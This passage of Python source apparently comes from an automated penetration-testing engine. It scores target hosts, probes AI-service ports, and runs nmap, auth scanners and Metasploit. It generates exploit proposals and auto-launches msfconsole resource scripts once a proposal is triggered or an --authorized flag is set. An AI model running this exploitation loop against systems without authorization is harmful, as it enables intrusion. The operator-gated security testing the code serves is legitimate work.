            sphere: float(getattr(field, "pearl_persistence", 0.0) or 0.0)
            for sphere, field in field_topology.spheres.items()
        }
        for cluster in compute_field_fibers():
            fiber_clusters_by_anchor[getattr(cluster, "anchor", "")] = cluster
    except Exception as exc:
        print(f"\n  [FIELD] Topology pull unavailable: {exc}")
        sphere_pulls = {}
        sphere_persistence = {}
        fiber_clusters_by_anchor = {}

    # ── Expire stale pending proposals (older than 30 min) ─────────────────
    # Prevents MSF dedup from blocking on proposals that were never actioned.
    _proposals_dir = SKG_STATE_DIR / "proposals"
    if _proposals_dir.exists():
        _now_ts = datetime.now(timezone.utc)
        for _pf in _proposals_dir.glob("*.json"):
            try:
                _pd = json.loads(_pf.read_text())
                if _pd.get("status") != "pending":
                    continue
                _age_s = (_now_ts - datetime.fromisoformat(
                    _pd.get("generated_at","1970-01-01T00:00:00+00:00")
                )).total_seconds()
                if _age_s > 14400:  # 4 hours
                    _pd["status"] = "expired"
                    _pf.write_text(json.dumps(_pd, indent=2))
            except Exception:
                pass

    # ── Compute entropy landscape ──
    print("\n  [FIELD] Computing entropy landscape...\n")

    landscape = []
    for target in surface.get("targets", []):
        ip = target["ip"]
        states = load_wicket_states(ip)

        # Determine applicable wickets based on target domains.
        # Augment from live services so cached surface domains are never stale.
        # A target with ssh:22 gets "host" + "sysaudit" regardless of surface tags.
        _SVCPORT_DOMAIN = {
            22:    ["host", "sysaudit"],
            3306:  ["host", "data_pipeline"],
            5432:  ["host", "data_pipeline"],
            5433:  ["host", "data_pipeline"],
            6379:  ["data_pipeline"],
            27017: ["data_pipeline"],
            80:    ["web"], 443: ["web"], 8080: ["web"], 8443: ["web"],
            8008:  ["web"], 8009: ["web"],
            # AI/ML service ports
            11434: ["ai_target"],   # Ollama
            6333:  ["ai_target"],   # Qdrant
            8000:  ["ai_target"],   # Chroma (also sometimes web)
            7860:  ["ai_target"],   # Gradio
            8888:  ["ai_target"],   # Jupyter
            5001:  ["ai_target"],   # MLflow
            8001:  ["ai_target"],   # Triton
            9000:  ["ai_target"],   # TorchServe
            4000:  ["ai_target"],   # LangServe
            6006:  ["ai_target"],   # TensorBoard
        }
        effective_domains = set(target.get("domains", []))
        for svc in target.get("services", []):
            port = svc.get("port")
            svc_name = (svc.get("name") or svc.get("service") or "").lower()
            # Port-based augmentation
            if port in _SVCPORT_DOMAIN:
                effective_domains.update(_SVCPORT_DOMAIN[port])
            # Name-based augmentation
            if any(x in svc_name for x in ("ssh","openssh")):
                effective_domains.update(["host","sysaudit"])
            if any(x in svc_name for x in ("mysql","mariadb","postgres")):
                effective_domains.update(["host","data_pipeline"])
            if any(x in svc_name for x in ("http","https","nginx","apache")):
                effective_domains.add("web")
        # If post-exploitation confirmed shell, add binary_analysis domain
        _postexp_file_pat = str(DISCOVERY_DIR / f"gravity_postexp_{ip.replace('.','_')}_*.ndjson")
        if list(glob.glob(_postexp_file_pat)):
            effective_domains.add("binary_analysis")
            effective_domains.add("container_escape")

        # Speculative AI domain detection: if no ai_target domain yet,
        # do a fast TCP check on known AI ports. Adds domain if any port open.
        # This runs once per target per gravity run (cheap: ~2s timeout total).
        if "ai_target" not in effective_domains:
            _AI_SPECULATIVE_PORTS = [11434, 6333, 8888, 7860, 5001, 4000, 6006]
            import socket as _sock
            for _ai_port in _AI_SPECULATIVE_PORTS:
                try:
                    _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                    _s.settimeout(0.5)
                    if _s.connect_ex((ip, _ai_port)) == 0:
                        effective_domains.add("ai_target")
                    _s.close()
                except Exception:
                    pass
                if "ai_target" in effective_domains:
                    break

        applicable = set()
        for domain in effective_domains:
            applicable.update(domain_wickets.get(domain, set()))

        field_pull_boost = _bounded_field_pull_boost(
            ip=ip,
            effective_domains=effective_domains,
            sphere_pulls=sphere_pulls,
            fiber_clusters_by_anchor=fiber_clusters_by_anchor,
            sphere_persistence=sphere_persistence,
        )

        # Base E: count of unknown catalogued wickets
        E_base = field_entropy(states, applicable, ip=ip)

        # Fold contribution: structural uncertainty on top of unknown nodes
        # Field pull contribution: bounded topology/fiber pressure from the
        # richer field law. This biases routing without replacing kernel E.
        # E = E_base + Σ fold.gravity_weight() + bounded field pull
        # This is the extended Work 3 formula — folds add to gravitational pull
        fold_manager = fold_manager_by_ip.get(ip)
        fold_boost   = fold_manager.total_gravity_weight() if fold_manager else 0.0
        E            = E_base + fold_boost + field_pull_boost

        unresolved = sum(
            max(
                float(states.get(w, {}).get("phi_u", 0.0) or 0.0),
                float(states.get(w, {}).get("local_energy", 0.0) or 0.0),
                1.0 if states.get(w, {}).get("status", "unknown") == "unknown" else 0.0,
            ) + float(states.get(w, {}).get("contradiction", 0.0) or 0.0)
            for w in applicable
            if states.get(w, {}).get("status", "unknown") == "unknown"
        )
        realized = sum(1 for w in applicable
                       if states.get(w, {}).get("status") == "realized")
        blocked = sum(1 for w in applicable
                      if states.get(w, {}).get("status") == "blocked")
        n_folds  = len(fold_manager.all()) if fold_manager else 0

        landscape.append({
            "ip": ip,
            "entropy":           E,
            "E_base":            E_base,
            "fold_boost":        fold_boost,
            "field_pull_boost":  field_pull_boost,
            "n_folds":           n_folds,
            "unknowns":          round(unresolved, 4),
            "realized":          realized,
            "blocked":           blocked,
            "total_wickets":     len(applicable),
            "applicable_wickets": applicable,
            "states":            states,
            "domains":           target.get("domains", []),
            "services":          target.get("services", []),
            "target":            target,
            "fold_manager":      fold_manager,
        })

    # Sort by entropy — follow the gradient
    landscape.sort(key=lambda x: x["entropy"], reverse=True)

    # Display field — show E breakdown: base unknowns + fold boost
    print(f"  {'IP':18s} {'E':>7s} {'Unr':>7s} {'Folds':>5s} {'Fold+':>6s} {'Field+':>6s} {'Real':>5s} {'Blk':>5s}")
    print(f"  {'-'*18} {'-'*7} {'-'*7} {'-'*5} {'-'*6} {'-'*6} {'-'*5} {'-'*5}")
    for t in landscape:
        fold_str = f"+{t['fold_boost']:.1f}" if t['fold_boost'] > 0 else "     "
        field_str = f"+{t['field_pull_boost']:.1f}" if t['field_pull_boost'] > 0 else "     "
        print(f"  {t['ip']:18s} {t['entropy']:7.2f} "
              f"{t['unknowns']:7.2f} {t['n_folds']:5d} {fold_str:>6s} {field_str:>6s} "
              f"{t['realized']:5d} {t['blocked']:5d}")

        # Print fold details for high-entropy targets
        if t['n_folds'] > 0 and t['fold_manager']:
            for fold in sorted(t['fold_manager'].all(),
                                key=lambda f: -f.gravity_weight())[:3]:
                print(f"    ↳ [{fold.fold_type:12s}] p={fold.discovery_probability:.2f} "
                      f"{fold.detail[:70]}")

    # ── Available instruments ──
    print(f"\n  [INSTRUMENTS]")
    for name, inst in instruments.items():
        status = "ready" if inst.available else "unavailable"
        print(f"    {name:20s} [{status:12s}] {inst.description[:50]}")

    # ── Follow the gradient ──
    print(f"\n  [GRADIENT] Following entropy gradient...\n")

    actions_taken = 0
    entropy_reduced = 0.0
    entropy_increased = 0.0

    for t in landscape:
        if t["entropy"] == 0:
            continue  # Fully determined — no gravitational pull

        ip = t["ip"]
        fold_note = (f", {t['n_folds']} folds (+{t['fold_boost']:.1f})"
                     if t['n_folds'] > 0 else "")
        field_note = (f", field (+{t['field_pull_boost']:.1f})"
                      if t.get("field_pull_boost", 0.0) > 0 else "")
        print(f"  → {ip} (E={t['entropy']:.2f}, "
              f"{t['unknowns']} unknowns{fold_note}{field_note})")

        # Score all available instruments — show the field landscape
        candidates = []
        for name, inst in instruments.items():
            if not inst.available:
                continue

            potential = entropy_reduction_potential(
                inst, ip, t["states"], t["applicable_wickets"])
            coherence = _instrument_observation_coherence(name, t["target"])
            if coherence <= 0.0:
                continue
            potential *= coherence
            # Pearl manifold boost: memory curvature from prior observations.
            # Applied multiplicatively when strong (boost > 1.0) to reflect
            # genuine field coupling, additively when weak (historical noise).
            p_boost = _pearl_reinforcement_boost(ip, inst)
            if p_boost >= 1.0:
                # Strong manifold coupling: multiply potential by (1 + boost/10)
                # so boost=5.0 → 50% increase, boost=10.0 → 100% increase
                potential *= (1.0 + p_boost / 10.0)
            else:
                potential += p_boost

            has_nmap_history = bool(glob.glob(str(DISCOVERY_DIR / f"gravity_nmap_{ip}_*.ndjson")))
            has_cve_history = bool(glob.glob(str(CVE_DIR / f"cve_events_{ip}_*.ndjson")))
            has_recent_web = _has_recent_artifact(str(DISCOVERY_DIR / f"gravity_http_{ip}_*.ndjson"))
            has_recent_auth = _has_recent_artifact(str(DISCOVERY_DIR / f"gravity_auth_{ip}_*.ndjson"))
            has_web_service = any(
                svc.get("service", "") in ("http", "https", "http-alt", "https-alt")
                for svc in t["target"].get("services", [])
            )
            has_versioned_service = any(
                (svc.get("banner") or "").strip()
                for svc in t["target"].get("services", [])
            )
            cold_start_target = (
                focus_target == ip
                or (t["unknowns"] >= 15 and (has_web_service or has_versioned_service))
            )
            if cold_start_target:
                if name == "nmap" and not has_nmap_history:
                    potential = max(potential, 25.0)
                if name == "nvd_feed" and has_versioned_service and not has_cve_history:
                    potential = max(potential, 18.0)
                if name == "http_collector" and has_web_service and not has_recent_web:
                    potential = max(potential, 12.0)
                if name == "auth_scanner" and has_web_service and not has_recent_auth:
                    potential = max(potential, 6.0)
                if name == "metasploit" and has_web_service:
                    potential = max(potential, 20.0)
                potential *= coherence

            # Show penalty status
            if inst.failed_to_reduce(ip):
                print(f"    {name:20s} potential={potential:.1f} (penalized — no entropy reduction last time)")
            elif potential > 0:
                print(f"    {name:20s} potential={potential:.1f}")

            if potential > 0:
                candidates.append((potential, name, inst))

        if not candidates:
            print(f"    No instruments can reduce entropy here")
            continue

        # Sort by potential
        candidates.sort(key=lambda x: x[0], reverse=True)

        # Focused target bootstrap:
        # On the first focused pass over a target, prefer broad collection over
        # narrow top-N selection so the canonical node state fills in quickly.
        bootstrap_focus = False
        if focus_target == ip or t["unknowns"] >= 25:
            bootstrap_markers = [
                f"gravity_ssh_{ip}_*.ndjson",
                f"gravity_pcap_{ip}_*.ndjson",
                f"gravity_ce_{ip.replace('.','_')}_*.ndjson",
                f"gravity_data_*{ip}*.ndjson",
                f"gravity_audit_{ip}_*.ndjson",
                f"gravity_ai_{ip.replace('.','_')}_*.ndjson",
                f"gravity_http_{ip}_*.ndjson",
                f"gravity_auth_{ip}_*.ndjson",
            ]
            bootstrap_focus = (
                t["unknowns"] >= 20
                or not any(glob.glob(str(DISCOVERY_DIR / pat)) for pat in bootstrap_markers)
            )

        bootstrap_names = {
            "nmap",
            "http_collector",
            "auth_scanner",
            "nvd_feed",
            "pcap",
            "ssh_sensor",
            "data_profiler",
            "sysaudit",
            "container_inspect",
            "ai_probe",
            "supply_chain",
        }

        if bootstrap_focus:
            chosen = []
            seen = set()
            for potential, name, inst in candidates:
                if name in bootstrap_names:
                    chosen.append((potential, name, inst))
                    seen.add(name)
            for name, inst in instruments.items():
                coherence = _instrument_observation_coherence(name, t["target"])
                if (
                    name in bootstrap_names
                    and name not in seen
                    and inst.available
                    and name != "iot_firmware"
                    and coherence > 0.0
                ):
                    chosen.append((max(0.1 * coherence, 0.05), name, inst))
            MAX_CONCURRENT = max(4, len(chosen))
            to_run = chosen[:MAX_CONCURRENT]
        else:
            # Normal steady-state: cap to the best few instruments.
            MAX_CONCURRENT = 4
            to_run = candidates[:MAX_CONCURRENT]

        # Keep operator-gated MSF review out of the concurrent worker pool so
        # other instrument stdout does not corrupt the interactive prompt.
        serial_item = None
        if sys.stdin.isatty():
            for item in list(to_run):
                if item[1] == "metasploit":
                    serial_item = item
                    to_run.remove(item)
                    break
            if serial_item is None:
                for item in candidates:
                    if item[1] == "metasploit":
                        serial_item = item
                        break

        selected_items = list(to_run)
        if serial_item:
            selected_items.append(serial_item)

        if bootstrap_focus:
            print(f"    Bootstrap sweep: {len(selected_items)} instruments")
            print(f"      " + ", ".join(f"{n}({p:.1f})" for p, n, _ in selected_items))
            if serial_item:
                print(f"      metasploit review will run after concurrent instruments complete")
        elif len(selected_items) == 1:
            print(f"    Selected: {selected_items[0][1]} (potential={selected_items[0][0]:.1f})")
        else:
            print(f"    Selected {len(selected_items)} instruments: " +
                  ", ".join(f"{n}({p:.1f})" for p,n,_ in selected_items))
            if serial_item:
                print(f"      metasploit review will run after concurrent instruments complete")

        # Execute concurrently
        E_before = t["entropy"]

        from concurrent.futures import ThreadPoolExecutor, as_completed

        def _run_one(args):
            _potential, _name, _inst = args
            return _name, execute_instrument(_inst, t["target"], run_id, out_path, t["states"], authorized=authorized)

        concurrent_results = {}
        if to_run:
            with ThreadPoolExecutor(max_workers=MAX_CONCURRENT) as pool:
                futures = {pool.submit(_run_one, item): item[1] for item in to_run}
                for future in as_completed(futures):
                    name, res = future.result()
                    concurrent_results[name] = res
        if serial_item:
            name, res = _run_one(serial_item)
            concurrent_results[name] = res

        # Generate follow-on exploit proposals in the main thread after the
        # instrument sweep so interactive review behaves cleanly.
        for _name, _res in concurrent_results.items():
            for _fo in _res.get("follow_on_paths", []) or []:
                try:
                    from exploit_dispatch import generate_exploit_proposals, _get_lhost
                    refreshed_states = load_wicket_states(ip)
                    realized = [
                        w for w, s in refreshed_states.items()
                        if isinstance(s, dict) and s.get("status") == "realized"
                    ]
                    proposals_dir = SKG_STATE_DIR / "proposals"
                    already_pending = None
                    if proposals_dir.exists():
                        for _f in proposals_dir.glob("*.json"):
                            try:
                                _p = json.loads(_f.read_text())
                            except Exception:
                                continue
                            if (
                                _p.get("status") == "pending"
                                and (
                                    ip in json.dumps(_p)
                                    or ip in _p.get("description", "")
                                    or ip in json.dumps(_p.get("hosts", []))
                                )
                                and _fo.get("path_id", "") in json.dumps(_p)
                            ):
                                already_pending = _p
                                break
                    if already_pending:
                        existing_id = already_pending.get("id", "")[:12]
                        existing_desc = already_pending.get("description", "")
                        print(f"    [EXPLOIT] Pending proposal already exists for {_fo['path_id']} on {ip}: {existing_id}")
                        if existing_desc:
                            print(f"      {existing_desc[:100]}")
                        if sys.stdin.isatty():
                            review = interactive_review(already_pending.get("id", ""))
                            decision = review.get("decision")
                            if decision and decision != "skipped":
                                print(f"    [EXPLOIT] Reviewed existing proposal {existing_id}: {decision}")
                        continue
                    props = generate_exploit_proposals(
                        path_id=_fo["path_id"],
                        target_ip=ip,
                        port=_fo.get("port", 0),
                        realized_wickets=realized,
                        lhost=_get_lhost(),
                        out_dir=out_path,
                        **(_fo.get("kwargs", {})),
                    )
                    if props:
                        print(f"    [EXPLOIT] {len(props)} proposal(s) generated for {_fo['path_id']}")
                except Exception as exc:
                    print(f"    [WARN] follow-on {_fo.get('path_id','?')} failed: {exc}")

        # Surface per-instrument failures so the operator sees what actually
        # happened, even if another instrument succeeded.
        for _name, _res in concurrent_results.items():
            if _res.get("error"):
                print(f"    [WARN] {_name} failed: {_res['error']}")

        # Merge: use last successful result for downstream E measurement
        # (any instrument that ran and didn't error counts as an action)
        result = {"success": False}
        for _name, _res in concurrent_results.items():
            if _res.get("success") or _res.get("action") == "operator":
                result = _res
                break
        if not result.get("success") and not result.get("action"):
            # All failed — use first result for error reporting
            result = next(iter(concurrent_results.values())) if concurrent_results else {"success": False}

        # Best instrument name and instance for reporting and penalty tracking.
        # In concurrent mode, all instruments that ran share the penalty outcome.
        lead_item = selected_items[0]
        best_name = lead_item[1]
        best_inst = lead_item[2]
        all_run_insts = [(name, inst) for _, name, inst in selected_items]

        # Measure entropy change — recompute including fold contribution
        # so delta_E reflects the full field energy shift, not just wicket changes
        # Refresh canonical surface and recompute applicable wickets after the
        # sweep so newly observed services/domains can collapse state in-cycle.
        try:
            refreshed_surface = _hydrate_surface_from_latest_nmap(surface_path)
            refreshed_target = next(
                (x for x in refreshed_surface.get("targets", []) if x.get("ip") == ip),
                t["target"],
            )
        except Exception:
            refreshed_target = t["target"]

        refreshed_domains = set(refreshed_target.get("domains", []))
        for svc in refreshed_target.get("services", []):
            port = int(svc.get("port", 0) or 0)
            svc_name = (svc.get("service") or svc.get("name") or "").lower()
            if port in _SVCPORT_DOMAIN:
                refreshed_domains.update(_SVCPORT_DOMAIN[port])
            if any(x in svc_name for x in ("ssh","openssh")):
                refreshed_domains.update(["host","sysaudit"])
            if any(x in svc_name for x in ("mysql","mariadb","postgres")):
                refreshed_domains.update(["host","data_pipeline"])
            if any(x in svc_name for x in ("http","https","nginx","apache","ajp13")):
                refreshed_domains.add("web")
        refreshed_applicable = set()
        for domain in refreshed_domains:
            refreshed_applicable.update(domain_wickets.get(domain, set()))

        new_states   = load_wicket_states(ip)
        E_after_base = field_entropy(new_states, refreshed_applicable, ip=ip)
        # Re-detect folds after instrument ran (structural folds may resolve
        # if a toolchain was created; temporal folds may refresh)
        new_fold_boost = t["fold_boost"]  # conservative: assume folds unchanged
        try:
            from skg.kernel.folds import FoldDetector, FoldManager
            new_fd = FoldDetector()
            new_folds = new_fd.detect_all(DISCOVERY_DIR, CVE_DIR, SKG_HOME)
            new_fm = FoldManager()
            for f in new_folds:
                if ip in f.location or f.location.endswith(ip):
                    new_fm.add(f)
            new_fold_boost = new_fm.total_gravity_weight()
        except Exception:
            pass
        E_after = E_after_base + new_fold_boost
        delta_E = E_before - E_after

        try:
            _record_cycle_pearl(
                ip=ip,
                run_id=run_id,
                cycle_num=cycle_num,
                before_states=t["states"],
                after_states=new_states,
                before_target=t["target"],
                after_target=refreshed_target,
                before_domains=set(t["target"].get("domains", [])),
                after_domains=refreshed_domains,
                before_entropy=E_before,
                after_entropy=E_after,
                before_fold_boost=t["fold_boost"],
                after_fold_boost=new_fold_boost,
                concurrent_results=concurrent_results,
                fold_manager=new_fm if 'new_fm' in locals() else None,
            )
        except Exception:
            pass

        if result.get("success"):
            actions_taken += 1
            if delta_E > 0:
                entropy_reduced += delta_E
            elif delta_E < 0:
                entropy_increased += abs(delta_E)

            if delta_E > 0:
                print(f"    ✓ Entropy reduced: {E_before:.2f} → {E_after:.2f} (ΔE={delta_E:+.2f})")
                resolved = result.get("unknowns_resolved", 0)
                if resolved:
                    print(f"      {resolved} unknowns collapsed")
            elif delta_E < 0:
                print(f"    ↗ Entropy surfaced: {E_before:.2f} → {E_after:.2f} (ΔE={delta_E:+.2f})")
                print(f"      New structure or unresolved folds increased the field energy")
            elif result.get("action") == "operator":
                # Operator-pending action (MSF proposal, SSH suggestion).
                # Do NOT record as a failure — the action hasn't been executed
                # yet.  Gravity should not penalise this instrument; it should
                # come back to it after the operator acts.  We record a neutral
                # entropy history entry (current E, not 999) so the penalty
                # trigger doesn't fire.
                print(f"    ⊕ Pending operator action: {result.get('suggestion', '')}")
                if result.get("proposal_id"):
                    print(f"      Proposal: {result['proposal_id']}")
                    print(f"      Approve:  skg proposals trigger {result['proposal_id']}")
                # Record current E (not a higher value) — neutral, not penalised
                for _n, _i in all_run_insts:
                    _i.entropy_history.setdefault(ip, []).append(E_after)
            else:
                print(f"    ○ No entropy change (E={E_after:.2f})")
                # Record a single no-op outcome. Repeated stagnation across
                # cycles triggers failed_to_reduce(), not one flat attempt.
                for _n, _i in all_run_insts:
                    _i.entropy_history.setdefault(ip, []).append(E_after)

        else:
            error = result.get("error", "execution failed (no error message captured)")
            print(f"    ✗ Failed: {error}")
            # Hard failure — record 999 so failed_to_reduce() fires immediately
            for _n, _i in all_run_insts:
                _i.entropy_history.setdefault(ip, []).append(999)

        # Process a broader slice of the field each cycle so whole-network
        # gravity behaves like a substrate sweep, not a top-3 scheduler.
        if actions_taken >= 5:
            break

    # ── Execute any triggered proposals before next cycle ─────────────────
    # Operator can run 'skg proposals trigger <id>' in another terminal
    # while gravity is running; gravity picks them up at cycle boundary.
    _proposals_dir = SKG_STATE_DIR / "proposals"
    if _proposals_dir.exists():
        try:
            for _pf in sorted(_proposals_dir.glob("*.json")):
                try:
                    _p = json.loads(_pf.read_text())
                    if _p.get("status") == "triggered":
                        _rc = _p.get("action",{}).get("rc_file","") or _p.get("rc_file","")
                        _pid = _p.get("id","?")[:12]
                        _tip = _p.get("action",{}).get("target_ip","?")
                        _action = _p.get("action", {})
                        _module_candidates = _action.get("module_candidates", [])
                        _all_aux = bool(_module_candidates) and all(
                            c.get("module_class", "").lower() == "auxiliary"
                            for c in _module_candidates
                        )
                        _sync_exec = _p.get("category") == "runtime_observation" or _all_aux
                        print(f"  [AUTO-EXEC] Triggered proposal {_pid} for {_tip}")
                        if _rc and Path(_rc).exists():
                            import subprocess as _sp
                            msf = _sp.run(["which","msfconsole"],capture_output=True)
                            if msf.returncode == 0:
                                _log = out_path / f"msf_auto_{_pid}_{run_id[:8]}.log"
                                if _sync_exec:
                                    _run = _sp.run(
                                        ["msfconsole", "-q", "-r", _rc],
                                        capture_output=True,
                                        text=True,
                                        timeout=120,
                                    )
                                    _log.write_text((_run.stdout or "") + (_run.stderr or ""))
                                    print(f"    msfconsole completed log={_log}")
                                    try:
                                        from skg.sensors.msf_sensor import (
                                            _parse_console_output,
                                            summarize_console_output,
                                        )
                                        _module = (_module_candidates[0].get("module")
                                                   if _module_candidates else "resource_script")
                                        _workload_id = f"{_p.get('domain', 'web')}::{_tip}"
                                        _events = _parse_console_output(_run.stdout or "", _workload_id, _module)
                                        _summary = summarize_console_output(_run.stdout or "")
                                        if _events:
                                            _events_file = out_path / f"msf_events_{_tip.replace('.','_')}_{run_id[:8]}.ndjson"
                                            with open(_events_file, "w") as _fh:
                                                for _ev in _events:
                                                    _ev.setdefault("payload", {})["target_ip"] = _tip
                                                    _fh.write(json.dumps(_ev) + "\n")
                                            EVENTS_DIR.mkdir(parents=True, exist_ok=True)
                                            (EVENTS_DIR / _events_file.name).write_text(_events_file.read_text())
                                            print(f"    ingested {len(_events)} MSF events → {_events_file.name}")
                                            _p["events_file"] = str(_events_file)
                                            _p["events_emitted"] = len(_events)
                                        if _summary.get("findings"):
                                            print(f"    findings: {', '.join(_summary['findings'][:5])}")
                                        if _summary.get("errors"):
                                            print(f"    parser notes: {', '.join(_summary['errors'][:3])}")
                                        _p["msf_summary"] = _summary
                                    except Exception as _ingest_exc:
                                        _p["ingest_error"] = str(_ingest_exc)
                                    _p["status"] = "executed"
                                    _p["log_file"] = str(_log)
                                    _p["returncode"] = _run.returncode
                                    _pf.write_text(json.dumps(_p))
                                else:
                                    _log_fh = open(_log, "w")
                                    _proc = _sp.Popen(
                                        ["msfconsole","-q","-r",_rc],
                                        stdin=_sp.DEVNULL,
                                        stdout=_log_fh,
                                        stderr=_sp.STDOUT,
                                        start_new_session=True,
                                        close_fds=True,
                                    )
                                    print(f"    msfconsole PID={_proc.pid} log={_log}")
                                    # Update status
                                    _p["status"] = "auto_executed"
                                    _p["pid"] = _proc.pid
                                    _p["log_file"] = str(_log)
                                    _pf.write_text(json.dumps(_p))
                            else:
                                print(f"    msfconsole not found — cannot auto-execute")
                        else:
                            if _p.get("proposal_kind") == "field_action":
                                print(f"    RC file missing: {_rc}")
                                _p["status"] = "error_missing_rc"
                                _p["error"] = f"RC file missing: {_rc}"
                                _pf.write_text(json.dumps(_p))
                except Exception as _e:
                    pass
        except Exception:
            pass

    # ── Cycle summary ──
    total_unknown   = round(sum(float(t["unknowns"]) for t in landscape), 4)
    total_folds     = sum(t["n_folds"]  for t in landscape)
    total_fold_boost = sum(t["fold_boost"] for t in landscape)
    total_entropy   = sum(t["entropy"]  for t in landscape)

    print(f"\n{'='*70}")
    print(f"  CYCLE {cycle_num} COMPLETE")
    print(f"  Actions : {actions_taken}")
    print(f"  ΔE      : {entropy_reduced:+.2f}")
    if entropy_increased > 0:
        print(f"  ΔE↑     : +{entropy_increased:.2f} surfaced")
    print(f"  Unresolved: {total_unknown:.2f}  Folds: {total_folds} (+{total_fold_boost:.2f})")
    print(f"  Total E : {total_entropy:.2f}  "
          f"(base {total_entropy - total_fold_boost:.2f} + "
          f"fold {total_fold_boost:.2f})")

    # Surface folds that need operator attention
    high_weight_folds = []
    for t in landscape:
        if t["fold_manager"]:
            for fold in t["fold_manager"].all():
                if fold.gravity_weight() >= 0.80:
                    high_weight_folds.append((t["ip"], fold))

    if high_weight_folds:
        print(f"\n  High-weight folds requiring attention:")
        for ip, fold in sorted(high_weight_folds,
                                key=lambda x: -x[1].gravity_weight())[:5]:
            print(f"    {ip:18s} {fold.id[:12]:12s} [{fold.fold_type:12s}] p={fold.discovery_probability:.2f} "
                  f"Φ={fold.gravity_weight():.2f}")
            print(f"      {fold.detail[:90]}")

    print(f"{'='*70}")

    # Persist fold state for this cycle, refreshed after instrument execution
    # so new same-cycle contextual/structural folds are visible immediately.
    try:
        from skg.kernel.folds import FoldDetector, FoldManager
        fold_state_dir = Path(out_dir) / "folds"
        fold_state_dir.mkdir(parents=True, exist_ok=True)
        refreshed_by_ip: dict[str, FoldManager] = {}
        for fold in FoldDetector().detect_all(
            events_dir=DISCOVERY_DIR,
            cve_dir=CVE_DIR,
            toolchain_dir=SKG_HOME,
        ):
            for target in surface.get("targets", []):
                tip = target["ip"]
                if tip in fold.location or fold.location.endswith(tip):
                    refreshed_by_ip.setdefault(tip, FoldManager()).add(fold)
                    break
        for ip, fm in refreshed_by_ip.items():
            fm.persist(fold_state_dir / f"folds_{ip.replace('.', '_')}.json")
    except Exception as exc:
        pass  # non-fatal

    return {
        "cycle":           cycle_num,
        "actions_taken":   actions_taken,
        "entropy_reduced": entropy_reduced,
        "entropy_increased": entropy_increased,
        "total_entropy":   total_entropy,
        "total_unknowns":  total_unknown,
        "total_folds":     total_folds,
        "fold_boost":      round(total_fold_boost, 4),
    }


# ── Main loop ────────────────────────────────────────────────────────────

def gravity_field_loop(surface_path: str, out_dir: str, max_cycles: int = 5,
                       authorized: bool = False, focus_target: str | None = None):
    """
    Run the gravity field dynamics.
    Continues until entropy stabilizes or max cycles reached.
    """
    instruments = detect_instruments()

    print(f"[SKG-GRAVITY] Gravity Field Engine v2")
    print(f"[SKG-GRAVITY] Surface: {surface_path}")
    print(f"[SKG-GRAVITY] Instruments: {sum(1 for i in instruments.values() if i.available)} available")
    print(f"[SKG-GRAVITY] Max cycles: {max_cycles}")

    prev_entropy = float('inf')
    stall_count = 0

    for i in range(1, max_cycles + 1):
        result = gravity_field_cycle(surface_path, out_dir, i, instruments,
                                     authorized=authorized, focus_target=focus_target)

        current_entropy = result["total_entropy"]

        # Check for convergence.
        # A field is stable only when ALL targets are fully determined (E=0)
        # or when genuinely no instrument can reduce entropy anywhere.
        # A single ΔE=0 cycle just means instruments need to rotate — not convergence.
        if result["actions_taken"] == 0:
            print(f"\n[SKG-GRAVITY] No actions possible — field stabilized.")
            break

        # Only converge if E=0 across all targets (fully determined)
        if current_entropy < 0.1:
            print(f"\n[SKG-GRAVITY] Field fully determined (E≈0). Engagement complete.")
            break

        # If entropy hasn't moved for 3 consecutive cycles, we're genuinely stuck.
        # Not after 1 cycle — that's just penalty rotation.
        if abs(current_entropy - prev_entropy) < 0.01 and i > 1:
            stall_count += 1
            if stall_count >= 3:
                print(f"\n[SKG-GRAVITY] Entropy stable for 3 cycles — field stable.")
                print(f"  Run with --authorized to attempt autonomous exploitation.")
                break
        else:
            stall_count = 0

        prev_entropy = current_entropy

        if i < max_cycles:
            print(f"\n[SKG-GRAVITY] Pausing 2s before next cycle...")
            time.sleep(2)

    print(f"\n[SKG-GRAVITY] Field dynamics complete.")


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="SKG Gravity Field Engine — entropy-driven field dynamics")
    parser.add_argument("--surface", default=None)
    parser.add_argument("--auto", action="store_true")
    parser.add_argument("--cycles", type=int, default=5)
    parser.add_argument("--authorized", action="store_true",
                        help="Authorized engagement mode: auto-execute exploit proposals")
    parser.add_argument("--target", default=None,
                        help="Focus gravity on a single target IP")
    parser.add_argument("--out-dir", dest="out_dir",
                        default=str(DISCOVERY_DIR))
    args = parser.parse_args()

    surface_path = args.surface
    if args.auto or not surface_path:
        surfaces = sorted(glob.glob(str(DISCOVERY_DIR / "surface_*.json")), key=os.path.getmtime)
        if not surfaces:
            print("[!] No surface files. Run discovery first.")
            sys.exit(1)
        surface_path = surfaces[-1]
        print(f"[SKG-GRAVITY] Using: {surface_path}")

    gravity_field_loop(surface_path, args.out_dir, max_cycles=args.cycles,
                   authorized=getattr(args,'authorized',False),
                   focus_target=getattr(args, 'target', None))


if __name__ == "__main__":
    main()
